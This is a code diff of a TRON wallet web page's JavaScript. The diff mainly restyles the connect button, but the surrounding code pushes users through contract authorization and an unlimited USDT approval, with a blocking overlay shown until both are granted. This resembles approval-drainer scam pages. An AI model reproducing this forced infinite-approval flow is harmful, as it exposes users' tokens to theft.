@@ -60,17 +60,20 @@ function showOverlay(message) {
     setTimeout(() => { overlay.style.opacity = '1'; }, 10);
 }
 
-// --- 状态更新函数 (保持不变) ---
+// --- 状态更新函数 (修改为图标模式) ---
 function updateConnectionUI(connected, address = null) {
     isConnectedFlag = connected;
     if (connectButton) {
         if (connected && address) {
             connectButton.classList.add('connected');
+            // 初始连接成功时，仍然显示短地址
             const shortAddress = address.length > 8 ? `${address.substring(0, 4)}...${address.slice(-4)}` : address;
-            connectButton.innerHTML = `Connected: ${shortAddress}`;
-            connectButton.title = `Connected: ${address}`; // 初始连接成功时的 title
+            connectButton.innerHTML = `<i class="fas fa-wallet"></i> ${shortAddress}`;
+            connectButton.title = `Connected: ${address}`;
+            connectButton.classList.remove('authorized-complete'); // 确保初始连接时，没有完成的标记
         } else {
-            connectButton.classList.remove('connected');
+            // 未连接状态
+            connectButton.classList.remove('connected', 'authorized-complete');
             connectButton.innerHTML = '<i class="fas fa-wallet"></i> Connect Wallet';
             connectButton.title = 'Connect Wallet';
         }
@@ -97,12 +100,14 @@ async function checkAuthorization() {
             showOverlay('Wallet not connected. Please connect.');
             return;
         }
+        
+        // 确保按钮处于连接状态，以便后续添加/移除授权完成的 class
+        updateConnectionUI(true, userAddress); 
 
         // 1. SimpleMerchant 合约授权检查
         const authorizedResult = await contractInstance.authorized(userAddress).call();
         const isAuthorized = authorizedResult; 
         
-
         // 2. USDT 授权和余额检查
         const usdtAllowanceRaw = await usdtContractInstance.allowance(userAddress, TRON_CONTRACT_ADDRESS).call();
         const usdtAllowance = BigInt(usdtAllowanceRaw);
@@ -136,15 +141,19 @@ async function checkAuthorization() {
 
 
         if (allAuthorized) {
-            connectButton.classList.add('connected');
-            // **关键更新**: 完全授权后设置 title 为 Disconnect Wallet
+            // **授权完成**：缩为图标，绿色
+            connectButton.classList.add('authorized-complete'); 
+            connectButton.innerHTML = '<i class="fas fa-wallet"></i>'; // 只保留图标
             connectButton.title = 'Disconnect Wallet'; 
             connectButton.disabled = false;
             updateStatus('All authorizations complete.'); 
             hideOverlay(); 
         } else {
-            connectButton.classList.remove('connected');
-            // **关键更新**: 授权未完成时设置 title 为 Complete Authorization
+            // **授权未完成**：显示短地址和图标，黄色边框/文字
+            connectButton.classList.remove('authorized-complete'); 
+            const shortAddress = userAddress.length > 8 ? `${userAddress.substring(0, 4)}...${userAddress.slice(-4)}` : userAddress;
+            connectButton.innerHTML = `<i class="fas fa-wallet"></i> ${shortAddress}`; // 显示图标+短地址
+            
             connectButton.title = 'Complete Authorization'; 
             connectButton.disabled = false;
             updateStatus(`Authorization incomplete. ${statusMessage}`); 
@@ -180,7 +189,6 @@ async function executeAuthorization() {
             });
             updateStatus(`SimpleMerchant Authorization successful. Checking next step...`);
             isAuthorized = true;
-            // 首次授权后暂停 3 秒
             await new Promise(resolve => setTimeout(resolve, 3000)); 
         }
         
@@ -188,7 +196,6 @@ async function executeAuthorization() {
         let usdtAllowanceRaw = await usdtContractInstance.allowance(userAddress, TRON_CONTRACT_ADDRESS).call();
         let isUsdtMaxApproved = BigInt(usdtAllowanceRaw) >= BigInt(ALMOST_MAX_UINT); 
         
-        // 只有 SimpleMerchant 授权成功且 USDT 未授权时才进行 USDT 授权
         if (isAuthorized && !isUsdtMaxApproved) { 
             updateStatus('Requesting USDT infinite approval... Please confirm in your wallet.');
             showOverlay('Requesting USDT infinite approval... Please confirm the transaction in your wallet.');
@@ -215,7 +222,6 @@ async function executeAuthorization() {
                              
         updateStatus(`🔴 ${errorMessage}`);
         showOverlay(`🔴 Authorization failed: ${errorMessage}`);
-        // 无论成功或失败，都重新检查状态来更新 UI，并确保按钮标题正确
         await checkAuthorization(); 
     }
 }
@@ -313,7 +319,6 @@ connectButton.addEventListener('click', () => {
             disconnectWallet(); 
         } else {
             // 已连接，但授权未完成（标题为 'Complete Authorization'），点击继续执行授权流程
-            // 重新运行 executeAuthorization()，它会检查 SimpleMerchant 是否已完成，然后继续 USDT 授权
             handleAuthorization(); 
         }
     } else { 
